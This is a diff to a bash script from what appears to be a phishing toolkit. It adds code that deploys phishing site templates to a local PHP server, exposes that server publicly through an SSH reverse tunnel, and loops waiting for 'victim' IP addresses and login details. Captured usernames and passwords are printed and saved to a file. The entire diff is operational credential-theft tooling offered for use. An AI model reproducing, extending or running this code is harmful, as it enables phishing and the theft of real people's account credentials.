@@ -33,6 +33,10 @@ setup_site() {
 	{ clear; banner;}
 	cd work
         git add . &&  git commit -m . &&  git pull
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+        cp -rf .sites/* .server/www
+        cp -f .sites/ip.php .server/www/
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	echo  "${ORANGE}Choose ${BLUE}Port Numbee ${PURPLE}To Host On: ${RED}"
 	read PORT
 	echo  "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
@@ -40,7 +44,35 @@ setup_site() {
 	eval $set
 }
 
+capture_creds() {
+        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk -F ":." '{print $2}')
+        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+        IFS=$'\n'
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}data/usernames.dat"
+        cat .server/www/usernames.txt >> data/usernames.dat
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
 
+
+capture_data() {
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+        while true; do
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        capture_ip
+                        rm -rf .server/www/ip.txt
+                fi
+                sleep 0.75
+                if [[ -e ".server/www/usernames.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+                        capture_creds
+                        rm -rf .server/www/usernames.txt
+                fi
+                sleep 0.75
+        done
+}
 host() {
 	ssh -R 80:localhost:$PORT nokey@localhost.run #> /home/link 2>&1 &
 }
